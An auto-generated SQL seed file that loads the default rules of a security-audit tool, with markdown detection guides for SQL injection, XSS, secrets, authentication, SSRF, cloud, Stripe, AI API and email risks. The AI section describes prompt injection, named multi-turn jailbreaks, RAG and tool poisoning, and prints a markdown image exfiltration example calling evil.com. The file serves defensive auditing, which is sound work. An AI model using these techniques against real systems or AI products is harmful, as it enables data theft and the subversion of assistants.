-- Snitch Default Rules Seed
-- Auto-generated from skills/snitch/categories/*.md
-- Generated: 2026-03-09T20:43:05.674Z

DELETE FROM rules WHERE rulesetId = 'snitch-default-v1';
DELETE FROM rulesets WHERE id = 'snitch-default-v1';

INSERT INTO rulesets (id, name, description, category, tags, isPublic, ownerId, ruleCount, createdAt, updatedAt) VALUES ('snitch-default-v1', 'Snitch Default Rules', 'Built-in security audit categories covering 40 vulnerability types, compliance standards, and performance checks.', 'security', 'default,system,built-in', 1, NULL, 40, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');

INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-01', 'snitch-default-v1', 'SQL Injection', '## CATEGORY 1: SQL Injection

### Detection
- Raw SQL usage: `pg`, `mysql2`, `better-sqlite3`, `knex` imports
- Query builder or ORM raw methods: `$queryRaw`, `$executeRaw`, `sql.raw`, `knex.raw`
- Database connection patterns without an ORM

### What to Search For
- String concatenation in SQL queries
- Template literal interpolation in queries
- Format string interpolation in queries

### Actually Vulnerable
- Direct string concatenation building SQL with user input
- Template literals inserting variables directly into SQL strings
- Python format strings with user variables in SQL

### NOT Vulnerable
- Parameterized queries with placeholders ($1, ?, :name)
- ORM methods that handle escaping (Prisma, TypeORM, Sequelize)
- Queries in comments or documentation
- Queries with only hardcoded values

### Context Check
1. Does user input actually flow into this query?
2. Is there validation/sanitization before this line?
3. Is this in test code or production code?

### Files to Check
- `**/db*.ts`, `**/query*.ts`, `**/sql*.ts`
- `**/repository*.ts`, `**/model*.ts`
- Database migration files, raw query utilities
', 'critical', NULL, NULL, '**/db*.ts, **/query*.ts, **/sql*.ts, **/repository*.ts, **/model*.ts, Database migration files, raw query utilities', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-02', 'snitch-default-v1', 'Cross-Site Scripting (XSS)', '## CATEGORY 2: Cross-Site Scripting (XSS)

### Detection
- Frontend framework usage: React, Vue, Angular, Svelte
- Server-rendered HTML: EJS, Pug, Handlebars templates
- DOM manipulation patterns in client-side code

### What to Search For
- DOM property assignments that inject raw HTML (the `inner` + `HTML` property)
- React unsafe HTML rendering (the `dangerously` + `SetInnerHTML` prop)
- DOM write methods (the `document` `.write` method)
- Vue v-html directive
- Unescaped template output

### Actually Vulnerable
- Assigning user input directly to the DOM''s raw HTML property
- Rendering user content as raw HTML in React via unsafe props
- Writing user data via DOM write methods
- Vue v-html with user-controlled content

### NOT Vulnerable
- Static HTML content assignment
- Using textContent instead of raw HTML properties
- Content sanitized with DOMPurify before use
- Admin-only or trusted source content

### Context Check
1. Where does the content come from?
2. Is there sanitization before rendering?
3. Is this admin-only or user-generated content?

### Files to Check
- `**/components/**/*.tsx`, `**/components/**/*.vue`
- `**/views/**`, `**/templates/**`
- Server-rendered template files (`.ejs`, `.pug`, `.hbs`)
', 'critical', NULL, NULL, '**/components/**/*.tsx, **/components/**/*.vue, **/views/**, **/templates/**, Server-rendered template files (.ejs, .pug, .hbs)', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-03', 'snitch-default-v1', 'Hardcoded Secrets', '## CATEGORY 3: Hardcoded Secrets

### Detection
- Any project with source code (universally applicable)
- `.env` files, config files, source files with string literals
- CI/CD configuration files

### What to Search For
- API keys assigned as string literals
- Passwords in code
- AWS access keys (AKIA prefix)
- Stripe keys (sk_live_, sk_test_)
- Private keys in source files

### Actually Vulnerable
- Real API keys assigned to variables
- Real passwords hardcoded in source
- AWS access keys embedded in code
- Private keys stored in source files

### NOT Vulnerable
- Environment variable references (process.env.X)
- Template placeholders
- Example values in comments
- Test/development placeholder values
- .env.example with dummy values
- Security scanner pattern definitions
- Real secrets in .env.local or .env.development that are gitignored (flag as Medium, not Critical — not committed to source)

### Context Check
1. Is this a real secret or a placeholder?
2. Is it in a test/example file?
3. Is it documentation or actual code?
4. Is the secret in a file listed in .gitignore (lower severity — not committed to git) vs. committed to source control (higher severity — already in history)?

### Files to Check
- `.env*`, `**/*.config.*`, `**/config/**`
- `docker-compose*.yml`, `Dockerfile*`
- CI/CD files: `.github/workflows/*`, `.gitlab-ci.yml`
', 'critical', NULL, NULL, '.env*, **/*.config.*, **/config/**, docker-compose*.yml, Dockerfile*, CI/CD files: .github/workflows/*, .gitlab-ci.yml', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-04', 'snitch-default-v1', 'Authentication Issues', '## CATEGORY 4: Authentication Issues

### Detection
- Auth libraries: `jsonwebtoken`, `passport`, `express-session`, `next-auth`, `@clerk/nextjs`, `better-auth`
- JWT usage: `jwt.sign`, `jwt.verify`, `jose` imports
- Session/cookie configuration patterns

### What to Search For
- Routes without auth middleware
- JWT signing with weak secrets
- JWT allowing none algorithm
- Insecure cookie settings
- Hardcoded session secrets
- Open redirects: `redirect()`, `res.redirect()` using `returnUrl`, `next`, `redirect_to` query params without allowlist validation
- WebSocket connections: `wss.on(''connection'', (ws) => { ... })` handlers that process messages before verifying authentication

### Actually Vulnerable
- Admin routes with no authentication middleware
- JWT secrets that are short or obvious
- Accepting none as a valid JWT algorithm
- Cookies without secure flag in production
- Session secrets hardcoded as simple strings
- `redirect(req.query.returnUrl)` without validating the URL is same-origin or on an allowlist
- `res.redirect(req.body.next)` after login with no URL validation
- WebSocket connection handler that processes data without checking session/JWT on the initial upgrade request

### NOT Vulnerable
- Routes with auth middleware applied
- Public routes that should be public
- JWT secrets loaded from environment
- Development-only insecure settings with env checks
- Redirect URLs validated against a same-origin check or explicit allowlist
- Auth provider handling redirects (Clerk, Auth0 handle this internally)
- WebSocket handlers that validate auth token from query params or headers on the `connection` event before any processing

### Context Check
1. Is middleware applied at router level?
2. Should this route be public?
3. Is insecure setting guarded by environment check?

### Files to Check
- `middleware.ts`, `**/auth/**`, `**/session/**`
- `pages/api/**`, `app/api/**`, `**/routes/**`
- JWT and session configuration files
', 'critical', NULL, NULL, 'middleware.ts, **/auth/**, **/session/**, pages/api/**, app/api/**, **/routes/**, JWT and session configuration files', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-05', 'snitch-default-v1', 'SSRF (Server-Side Request Forgery)', '## CATEGORY 5: SSRF (Server-Side Request Forgery)

### Detection
- HTTP client libraries: `fetch`, `axios`, `got`, `node-fetch`, `undici`
- URL construction from dynamic sources
- Webhook or callback URL handling patterns

### What to Search For
- fetch/axios/request with dynamic URLs
- User input flowing into URL parameters
- Webhook URL handling
- URL validation using weak methods

### Actually Vulnerable
- Fetching URLs directly from user input
- User-controlled webhook/callback URLs
- Validation using string includes instead of proper parsing

### NOT Vulnerable
- Hardcoded URLs
- Environment variable base with static paths
- Proper URL parsing with allowlist validation
- Internal service calls without user input

### Context Check
1. Does user input flow into the URL?
2. Is there URL validation before the request?
3. Does validation handle IP bypass formats?

### Files to Check
- `**/api/**`, `**/routes/**`, `**/services/**`
- Webhook handlers, callback URL processors
- HTTP client utility files
', 'critical', NULL, NULL, '**/api/**, **/routes/**, **/services/**, Webhook handlers, callback URL processors, HTTP client utility files', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-06', 'snitch-default-v1', 'Supabase Security', '## CATEGORY 6: Supabase Security

### Detection
- `@supabase/supabase-js`, `@supabase/ssr` imports
- `SUPABASE_URL`, `SUPABASE_ANON_KEY`, `SUPABASE_SERVICE_ROLE_KEY` environment variables
- Supabase migration files in `supabase/migrations/`

### What to Search For
- Tables without RLS in migrations
- Service role key in client code
- Service role in NEXT_PUBLIC variables
- RLS policies using just true

### Actually Vulnerable
- CREATE TABLE without matching RLS enablement
- Service role key passed to client-side code
- Service role key in public environment variables
- RLS policies that allow everything

### NOT Vulnerable
- Tables with RLS enabled and real policies
- Service role in server-only code
- Anon key in client code (expected)
- Intentionally public tables

### Context Check
1. Does each table have matching RLS?
2. Do RLS policies actually restrict access?
3. Is service role key server-side only?

### Files to Check
- `supabase/migrations/**`, `supabase/seed.sql`
- `lib/supabase*.ts`, `utils/supabase*.ts`
- `.env*`, `next.config.*`
', 'high', NULL, NULL, 'supabase/migrations/**, supabase/seed.sql, lib/supabase*.ts, utils/supabase*.ts, .env*, next.config.*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-07', 'snitch-default-v1', 'Rate Limiting', '## CATEGORY 7: Rate Limiting

### Detection
- Auth endpoints: login, signup, password reset, OTP verification routes
- Rate limiter libraries: `express-rate-limit`, `@upstash/ratelimit`, `rate-limiter-flexible`
- API routes handling sensitive operations

### What to Search For
- Auth endpoints: login, signup, password reset
- Rate limiter imports and usage
- In-memory vs persistent rate limiting

### Actually Vulnerable
- Login endpoint with no visible rate limiting
- Password reset without rate limiting
- In-memory limiter in production

### NOT Vulnerable
- Endpoints with rate limit middleware
- Infrastructure-level limiting (Cloudflare, WAF)
- Redis-backed rate limiting
- Non-sensitive endpoints

### Context Check
1. Is rate limiting handled at infrastructure level (Cloudflare, AWS WAF, API Gateway)?
2. Is this a public endpoint or a sensitive auth endpoint?
3. Is there a reverse proxy or load balancer applying rate limits upstream?

### Files to Check
- `**/login*.ts`, `**/signup*.ts`, `**/password*.ts`
- `**/auth/**`, `pages/api/auth/**`, `app/api/auth/**`
- Rate limiter configuration and middleware files
', 'high', NULL, NULL, '**/login*.ts, **/signup*.ts, **/password*.ts, **/auth/**, pages/api/auth/**, app/api/auth/**, Rate limiter configuration and middleware files', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-08', 'snitch-default-v1', 'CORS Configuration', '## CATEGORY 8: CORS Configuration

### Detection
- CORS middleware: `cors` package, `Access-Control-Allow-Origin` headers
- Framework CORS config: Next.js `next.config.js` headers, Express `cors()` middleware
- Manual header setting in API routes

### What to Search For
- CORS middleware configuration
- Access-Control headers
- Origin handling with credentials

### Actually Vulnerable
- Wildcard origin combined with credentials enabled
- Origin reflection without validation

### NOT Vulnerable
- Wildcard origin without credentials (public APIs)
- Specific origin allowlist
- Origin validation function

### Context Check
1. Is this a public API intended for cross-origin access?
2. Are credentials (cookies, auth headers) being sent with CORS requests?
3. Is the origin allowlist properly restricted to known domains?

### Files to Check
- `**/cors*.ts`, `**/middleware*.ts`
- `next.config.*`, `**/server*.ts`
- API route files setting response headers
', 'high', NULL, NULL, '**/cors*.ts, **/middleware*.ts, next.config.*, **/server*.ts, API route files setting response headers', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-09', 'snitch-default-v1', 'Cryptography', '## CATEGORY 9: Cryptography

### Detection
- Crypto libraries: `crypto`, `bcrypt`, `argon2`, `scrypt`, `jose`
- Hashing functions: `createHash`, `md5`, `sha1` (NOT sha256 or sha512 — those are fine)
- Encryption patterns: `createCipheriv`, `encrypt`, `decrypt`

### What to Search For
- MD5/SHA1 for password hashing
- Math.random for security tokens
- Hardcoded encryption keys
- Weak cipher modes

### Actually Vulnerable
- Weak hashes for password storage
- Predictable random for security purposes
- Encryption keys in source code
- ECB mode or deprecated ciphers

### NOT Vulnerable
- MD5/SHA1 for checksums only
- Secure random functions for tokens
- bcrypt/argon2/scrypt for passwords
- Keys from environment variables
- SHA-256, SHA-384, SHA-512 in any context (these are strong hashes — not a finding)

### Context Check
1. Is the weak hash used for password storage or non-security purposes (checksums)?
2. Is Math.random used for security tokens or UI randomization?
3. Are encryption keys loaded from environment or hardcoded?

### Files to Check
- `**/auth*.ts`, `**/crypto*.ts`, `**/hash*.ts`
- `**/token*.ts`, `**/password*.ts`
- Encryption and key management utilities
', 'high', NULL, NULL, '**/auth*.ts, **/crypto*.ts, **/hash*.ts, **/token*.ts, **/password*.ts, Encryption and key management utilities', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-10', 'snitch-default-v1', 'Dangerous Code Patterns', '## CATEGORY 10: Dangerous Code Patterns

### Detection
- Dynamic code evaluation functions (JS eval, dynamic Function constructor, VM context runners)
- Shell/process execution modules (Node process spawning, shell command runners, sync variants)
- Unsafe deserialization (JSON.parse with untrusted input, YAML unsafe load, Python serialization modules)

### What to Search For
- Dynamic code evaluation patterns
- Shell command execution with user input
- Unsafe deserialization
- Unsafe YAML loading
- GraphQL introspection enabled in production: `introspection: true` in Apollo/GraphQL Yoga server config (leaks full schema)
- GraphQL server missing query depth and complexity limits (DoS vector)

### Actually Vulnerable
- User input in code evaluation
- Shell commands with concatenated user input
- Deserializing untrusted data
- YAML load without safe loader
- Apollo Server with `introspection: true` and no NODE_ENV guard (schema fully exposed)
- GraphQL server with no `depthLimit` or `queryComplexity` plugin (unbounded query cost)

### NOT Vulnerable
- Build tool configurations
- Static commands without user input
- Safe deserialization methods
- Vendor/node_modules code
- `introspection: process.env.NODE_ENV !== ''production''` (disabled in prod)
- Introspection guarded by admin-only authorization
- Depth/complexity limits configured

### Context Check
1. Does user input flow into the evaluated code or shell command?
2. Is this a build-time script or production runtime code?
3. Is the deserialized data from a trusted internal source?

### Files to Check
- `**/exec*.ts`, `**/shell*.ts`, `**/worker*.ts`
- `**/eval*.ts`, `**/script*.ts`
- Build scripts, task runners, utility scripts
', 'high', NULL, NULL, '**/exec*.ts, **/shell*.ts, **/worker*.ts, **/eval*.ts, **/script*.ts, Build scripts, task runners, utility scripts', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-11', 'snitch-default-v1', 'Cloud Security', '## CATEGORY 11: Cloud Security

### Detection
- Cloud SDKs: `aws-sdk`, `@aws-sdk/*`, `@google-cloud/*`, `@azure/*`
- Infrastructure-as-code: Terraform (`.tf`), CloudFormation, Pulumi files
- Cloud environment variables: `AWS_ACCESS_KEY_ID`, `GOOGLE_APPLICATION_CREDENTIALS`

### What to Search For
- Cloud credentials in code
- Overly permissive IAM policies
- Open security groups
- Service account keys in repo

### Actually Vulnerable
- IAM with wildcard action AND resource
- Security groups open to 0.0.0.0/0 on sensitive ports
- Hardcoded cloud credentials
- Service account JSON committed

### NOT Vulnerable
- Constrained IAM policies
- Web ports open to public
- Secret manager references

### Context Check
1. Is the IAM policy scoped to specific resources or using wildcards?
2. Is the security group for a web server (80/443) or sensitive service?
3. Are credentials in code or loaded from a secret manager?

### Files to Check
- `**/*.tf`, `**/cloudformation*.yml`, `**/pulumi*.ts`
- `**/iam*.json`, `**/policy*.json`
- `.env*`, `**/credentials*`, `**/serviceaccount*`
', 'high', NULL, NULL, '**/*.tf, **/cloudformation*.yml, **/pulumi*.ts, **/iam*.json, **/policy*.json, .env*, **/credentials*, **/serviceaccount*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-12', 'snitch-default-v1', 'Logging and Data Exposure', '## CATEGORY 12: Logging and Data Exposure

### Detection
- Logging libraries: `winston`, `pino`, `morgan`, `bunyan`, `console.log`
- Error handling: `catch` blocks, error middleware, error boundary components
- Debug configuration: `DEBUG=*`, `NODE_ENV` checks

### What to Search For
- Sensitive data in logs
- Stack traces to clients
- Debug mode in production
- Verbose error responses

### Actually Vulnerable
- Passwords or tokens in log statements
- Stack traces returned in API responses
- Debug enabled in production config

### NOT Vulnerable
- Logging without sensitive data
- Development-only verbose errors
- Redacted logging
- Error tracking with PII filtering

### Context Check
1. Does the log statement include sensitive data (passwords, tokens, PII)?
2. Is verbose error output guarded by a NODE_ENV check?
3. Is this a development/debug log or production logging?

### Files to Check
- `**/logger*.ts`, `**/logging*.ts`
- `**/error*.ts`, `**/middleware*.ts`
- Error boundary components, API error handlers
', 'medium', NULL, NULL, '**/logger*.ts, **/logging*.ts, **/error*.ts, **/middleware*.ts, Error boundary components, API error handlers', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-13', 'snitch-default-v1', 'Stripe Security', '## CATEGORY 13: Stripe Security

### Detection
- `stripe` or `@stripe/stripe-js` imports
- `STRIPE_` environment variables

### What to Search For
- Secret keys in client code or public env vars
- Webhook endpoints without signature verification
- Test keys in production without env guards

### Critical
- `STRIPE_SECRET_KEY` or `sk_live_*` in client-side code
- `STRIPE_SECRET_KEY` in `NEXT_PUBLIC_*` variables
- Webhook endpoint missing `stripe.webhooks.constructEvent` verification

### High
- Test keys (`sk_test_*`) in production code without environment guards
- Missing `STRIPE_WEBHOOK_SECRET` verification in webhook handlers
- Hardcoded price IDs that should be environment variables

### Medium
- Publishable key (`pk_*`) hardcoded instead of environment variable
- Missing idempotency keys on payment intents

### Context Check
1. Is this server-only code or client-accessible code?
2. Are webhook endpoints properly validating Stripe signatures?
3. Are test keys guarded by environment checks (NODE_ENV)?

### NOT Vulnerable
- `STRIPE_SECRET_KEY` in server-only code (API routes, server actions)
- Publishable key (`pk_*`) in client code (expected)
- Test keys in test files or development configuration

### Files to Check
- `**/stripe*.ts`, `**/checkout*.ts`, `**/webhook*.ts`
- `pages/api/webhook*`, `app/api/webhook*`
- `.env*`, `next.config.*`
', 'critical', NULL, NULL, '**/stripe*.ts, **/checkout*.ts, **/webhook*.ts, pages/api/webhook*, app/api/webhook*, .env*, next.config.*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-14', 'snitch-default-v1', 'Auth Provider Security (Clerk, Auth0, NextAuth)', '## CATEGORY 14: Auth Provider Security (Clerk, Auth0, NextAuth)

### Detection
- `@clerk/nextjs`, `@auth0/nextjs-auth0`, `next-auth` imports
- `CLERK_`, `AUTH0_`, `NEXTAUTH_` environment variables

### What to Search For
- Secret keys exposed to client
- Missing middleware on protected routes
- Weak or missing secrets

### Clerk Critical
- `CLERK_SECRET_KEY` in client-side code or `NEXT_PUBLIC_*`
- Missing `authMiddleware` or `clerkMiddleware` on protected routes

### Auth0 Critical
- `AUTH0_SECRET` or `AUTH0_CLIENT_SECRET` in frontend code
- `AUTH0_ISSUER_BASE_URL` mismatch with allowed callback URLs

### NextAuth Critical
- `NEXTAUTH_SECRET` exposed in client code
- `NEXTAUTH_SECRET` shorter than 32 characters
- `secret` option missing in NextAuth config
- Callbacks without proper validation

### High (All Providers)
- JWT secrets in client bundles
- Missing CSRF protection on auth endpoints
- Redirect URL validation missing (open redirect vulnerability)
- Session tokens stored in localStorage (should be httpOnly cookies)

### Context Check
1. Is auth middleware applied at the router/layout level covering all protected routes?
2. Are secrets in server-only files or potentially bundled into client code?
3. Is redirect URL validation handled by the auth provider or custom code?

### NOT Vulnerable
- `NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY` in client (expected)
- Secret keys in server-only code
- Auth middleware properly applied at router level

### Files to Check
- `middleware.ts`, `middleware.js`
- `**/auth/**`, `pages/api/auth/**`, `app/api/auth/**`
- `auth.config.*`, `auth.ts`, `.env*`
', 'high', NULL, NULL, 'middleware.ts, middleware.js, **/auth/**, pages/api/auth/**, app/api/auth/**, auth.config.*, auth.ts, .env*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-15', 'snitch-default-v1', 'AI API Security', '## CATEGORY 15: AI API Security

> **OWASP references:** LLM01 (Prompt Injection), LLM02 (Sensitive Information Disclosure), LLM05 (Improper Output Handling), LLM06 (Excessive Agency), LLM07 (System Prompt Leakage), LLM10 (Unbounded Consumption). Also covers ASI01–ASI06 from the OWASP Top 10 for Agentic Applications (2026).
>
> **Cross-reference:** Category 3 (Hardcoded Secrets) covers key exposure in general. This category focuses on AI-specific risks: prompt injection, output handling, agent permissions, conversation security, and cost controls.

### Detection
- AI SDK imports: `openai`, `@anthropic-ai/sdk`, `ai`, `@ai-sdk/openai`, `@ai-sdk/anthropic`, `@langchain/core`, `langchain`, `llamaindex`, `@google/generative-ai`, `cohere-ai`
- Environment variables: `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GOOGLE_AI_API_KEY`, `COHERE_API_KEY`
- Agent/tool frameworks: `@modelcontextprotocol/sdk`, `autogen`, `crewai`, `langchain/agents`
- RAG patterns: vector store imports (`@pinecone-database/pinecone`, `chromadb`, `weaviate-client`, `@qdrant/js-client-rest`, `pgvector`)
- Chat/conversation handlers with message history accumulation

### What to Search For

**Prompt injection (direct):**
- User input concatenated or interpolated into prompt strings without structural separation
- Template literals building prompts: `` `You are a helper. User says: ${userInput}` ``
- System prompts that contain secrets, API keys, internal URLs, or authorization logic
- Reliance on "never reveal your instructions" as a security control

**Prompt injection (indirect):**
- External content (web scraping, file uploads, database rows, emails) fed into LLM context without sanitization
- RAG pipelines where retrieved document chunks are inserted directly into prompts
- Tool results passed back to the model without sanitization

**Multi-turn jailbreaks (Crescendo, Many-Shot, Skeleton Key, Bad Likert Judge):**
- Full conversation history passed to the model without per-turn content filtering
- No limit on conversation length or context window usage
- No monitoring for escalation patterns across turns
- Chat handlers that blindly accumulate messages: `messages = [...history, newMessage]`

**Improper output handling (LLM-to-app injection):**
- LLM output used in SQL queries, shell commands, `eval()`, or `Function()` calls
- LLM output rendered as raw HTML/markdown without sanitization (XSS via AI output)
- LLM-generated code executed without sandboxing
- Text-to-SQL or natural-language-to-query patterns where output is executed directly

**Data exfiltration via output:**
- LLM output rendered as markdown with support for external images (markdown image injection: `![](https://evil.com/steal?data=SECRET)`)
- No CSP restricting image sources in chat UI
- No URL allowlisting on rendered LLM content

**Excessive agency / over-permissioned agents:**
- Agent tools registered with more permissions than needed (write/delete when only read is required)
- Database credentials with admin access passed to agent tool functions
- No human-in-the-loop confirmation for destructive actions
- Shell/command execution tools available to the agent

**Sensitive data in prompts:**
- User PII (names, emails, medical data) included in prompts sent to external LLM APIs
- Full prompt/completion pairs logged to files, databases, or third-party services without redaction
- Conversation history stored in plaintext

**Unbounded consumption / denial of wallet:**
- No `max_tokens` on API calls
- No per-user rate limiting on AI endpoints
- No per-user or per-session token budget
- Agent loops without iteration limits (`while (!done)` with no max)
- No timeout on LLM API calls

**RAG poisoning:**
- User-submitted content automatically indexed into vector stores without validation
- No per-user isolation of vector store data (user A can retrieve user B''s documents)
- Web-scraped content fed directly into knowledge base

**MCP / tool supply chain:**
- MCP server packages installed from unvetted sources without pinned versions
- Tool descriptions containing hidden instruction-like text (tool poisoning)
- Multiple MCP servers connected to the same agent without isolation

### Critical
- AI API key (`sk-*`, `sk-ant-*`) in client-side code, `NEXT_PUBLIC_*` variables, or frontend bundles
- LLM output passed directly to `eval()`, `exec()`, `Function()`, shell execution, or raw SQL execution without parameterization
- Agent with shell/command execution tool + network access + no human approval gate
- No expiration or budget cap on API key — a leaked key has unlimited spend
- User input concatenated directly into system prompt that contains API keys, database URLs, or authorization rules

### High
- Direct prompt injection: user input interpolated into prompts with no structural boundary or content filtering
- Full conversation history sent to model with no per-turn safety re-evaluation (vulnerable to Crescendo, Many-Shot, Skeleton Key jailbreaks)
- LLM output rendered as markdown/HTML without sanitization — enables XSS and markdown image exfiltration
- No rate limiting on AI endpoints (denial-of-wallet — attacker can burn through your API budget)
- No `max_tokens` set on any API call (single request can generate maximum-length response at full cost)
- System prompt contains secrets, internal URLs, or authorization logic (extractable via prompt leakage techniques)
- Agent tools with write/delete permissions when only read is needed (excessive agency)
- User PII sent to external LLM API with no redaction and no data processing agreement
- RAG pipeline with no per-user isolation — any user can retrieve any document
- User uploads automatically indexed into shared vector store without review

### Medium
- Prompt/completion pairs logged to console, files, or third-party observability tools (Langfuse, LangSmith, Helicone) without PII redaction
- No input length validation before API calls (context window stuffing)
- Raw API error messages exposed to users (may leak model config, internal URLs, or prompt fragments)
- Agent loops without explicit iteration limits (could run indefinitely on bad input)
- MCP servers installed from npm/pip without pinned versions or integrity checks
- System prompt relies on "never reveal these instructions" as a security mechanism (trivially bypassed)
- No relevance score threshold on RAG retrieval (low-quality matches included in context)
- AI API keys in `.env` files that are not in `.gitignore` (may end up in git history)

### Context Check
1. Is the AI endpoint server-only or reachable from client code?
2. Is user input structurally separated from system instructions (separate message roles), or concatenated into a single string?
3. Does the app filter or validate LLM output before using it in downstream operations (SQL, HTML, shell, file paths)?
4. For chat apps: is conversation history re-evaluated for safety on each turn, or passed through blindly?
5. Does the app render LLM output as markdown/HTML? If so, are external images blocked?
6. For agents: what tools are registered, and do they follow least-privilege? Is there a human approval step for destructive actions?
7. Is user PII included in prompts? Are prompts/completions logged?
8. Are there cost controls: `max_tokens`, rate limits, per-user budgets, agent loop limits?
9. For RAG apps: is the vector store per-user, or shared? Can users contribute content to the knowledge base?

### NOT Vulnerable
- API keys in server-only code loaded from environment variables, never exposed to the client
- User input passed as a separate `user` role message with clear structural separation from the system prompt
- LLM output treated as untrusted: HTML-escaped before rendering, parameterized before SQL, never passed to eval/exec
- Per-turn content filtering on both input and output in chat applications
- Conversation length bounded with sliding window or summarization
- Agent tools scoped to minimum necessary permissions with human approval for destructive actions
- PII redacted before prompt assembly; logging excludes or redacts prompt content
- `max_tokens` set on all API calls; per-user rate limits enforced; API spend alerts configured
- RAG with per-user namespaces and access control metadata on vector queries
- System prompt contains no secrets — authorization enforced at the application layer
- Strict CSP blocking external image sources in chat UI (prevents markdown exfiltration)
- MCP server versions pinned with integrity hashes; tool descriptions reviewed

### Files to Check
- `**/ai/**`, `**/chat/**`, `**/llm/**`, `**/agent/**`, `**/rag/**`
- `**/openai*.{ts,js}`, `**/anthropic*.{ts,js}`, `**/completion*.{ts,js}`
- `pages/api/ai*`, `pages/api/chat*`, `app/api/ai*`, `app/api/chat*`
- `**/tools/**`, `**/functions/**`, `**/plugins/**` (agent tool definitions)
- `**/embed*.{ts,js}`, `**/vector*.{ts,js}`, `**/index*.{ts,js}` (RAG pipelines)
- `**/mcp*.{ts,js}`, `.cursor/mcp.json`, `claude_desktop_config.json`, `mcp.json`
- `.env*`, `**/config/**`
', 'critical', NULL, NULL, '**/ai/**, **/chat/**, **/llm/**, **/agent/**, **/rag/**, **/openai*.{ts,js}, **/anthropic*.{ts,js}, **/completion*.{ts,js}, pages/api/ai*, pages/api/chat*, app/api/ai*, app/api/chat*, **/tools/**, **/functions/**, **/plugins/** (agent tool definitions), **/embed*.{ts,js}, **/vector*.{ts,js}, **/index*.{ts,js} (RAG pipelines), **/mcp*.{ts,js}, .cursor/mcp.json, claude_desktop_config.json, mcp.json, .env*, **/config/**', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-16', 'snitch-default-v1', 'Email Service Security (Resend, SendGrid, Postmark)', '## CATEGORY 16: Email Service Security (Resend, SendGrid, Postmark)

### Detection
- `resend`, `@sendgrid/mail`, `postmark` imports
- `RESEND_API_KEY`, `SENDGRID_API_KEY`, `POSTMARK_API_TOKEN` environment variables

### What to Search For
- API keys in client code
- User-controlled email addresses or content
- Missing rate limiting

### Critical
- `RESEND_API_KEY`, `SENDGRID_API_KEY`, or `POSTMARK_API_TOKEN` in client-side code
- Email API keys in `NEXT_PUBLIC_*` variables

### High
- User-controlled `to` address without validation (spam relay)
- User-controlled email content without sanitization (email injection via headers)
- Missing rate limiting on email endpoints

### Medium
- User-controlled `from` address (spoofing)
- No domain verification for sender addresses
- Logging full email content including sensitive data

### Context Check
1. Is the email endpoint server-only or accessible from client code?
2. Is the recipient address hardcoded or user-controlled?
3. Is there rate limiting to prevent email flooding?
4. Is email content sanitized to prevent header injection?

### NOT Vulnerable
- API keys in server-only code
- Hardcoded recipient for contact forms
- Properly validated email addresses

### Files to Check
- `**/email*.ts`, `**/send*.ts`, `**/mail*.ts`
